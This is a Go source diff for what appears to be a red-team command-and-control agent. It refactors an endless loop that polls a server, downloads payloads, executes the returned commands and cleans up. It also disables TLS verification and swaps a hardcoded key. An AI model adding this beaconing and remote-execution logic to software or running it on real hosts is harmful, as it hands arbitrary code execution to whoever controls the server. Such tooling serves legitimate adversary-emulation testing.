@@ -9,42 +9,49 @@ import (
 	"os/user"
 	"time"
 	"reflect"
+	"runtime"
 	"./api"
 	"./cleanup"
 	"./util"
+	"./execute"
 )
 
 var iteration = 60
 
-func askForInstructions(server string, group string, paw string) {
-	commands := api.Instructions(server, group, paw)
+func askForInstructions(profile map[string]string) {
+	commands := api.Instructions(profile)
 	if commands != nil && len(commands.([]interface{})) > 0 {
 		cmds := reflect.ValueOf(commands)
 		for i := 0; i < cmds.Len(); i++ {
 			cmd := cmds.Index(i).Elem().String()
 			fmt.Println("[*] Running instruction")
 			command := util.Unpack([]byte(cmd))
-			api.Drop(server, command["payload"].(string))
-			api.Execute(server, paw, command)
+			api.Drop(profile["server"], command["payload"].(string))
+			api.Execute(profile, command)
 			cleanup.Apply(command)
 		}
 	} else {
-		cleanup.Run()
+		cleanup.Run(profile)
 		time.Sleep(time.Duration(iteration) * time.Second)
 	}
 }
 
-func main() {
-	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+func buildProfile(server string, group string, executor string) map[string]string {
 	host, _ := os.Hostname()
 	user, _ := user.Current()
 	paw := fmt.Sprintf("%s$%s", host, user.Username)
-
-	server := flag.String("server", "http://localhost:8888", "The FQDN of the server")
-	group := flag.String("group", "my_group", "Attach a group to this agent")
-	flag.Parse()
-
-	for { askForInstructions(*server, *group, paw) }
+	return map[string]string{"paw": paw, "server": server, "group": group, "platform": runtime.GOOS, "executor": executor} 
 }
 
-var key = "S8ULTPMU1W1HM9FH5N2OROMPP2I6FN"
+func main() {
+	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+	server := flag.String("server", "http://localhost:8888", "The FQDN of the server")
+	group := flag.String("group", "my_group", "Attach a group to this agent")
+	executor := flag.String("executor", execute.DetermineExecutor(runtime.GOOS), "Attach a group to this agent")
+	flag.Parse()
+
+	profile := buildProfile(*server, *group, *executor)
+	for { askForInstructions(profile) }
+}
+
+var key = "DE5GJ62X6RXM6L0UA7UFKN7C4SXBGG"
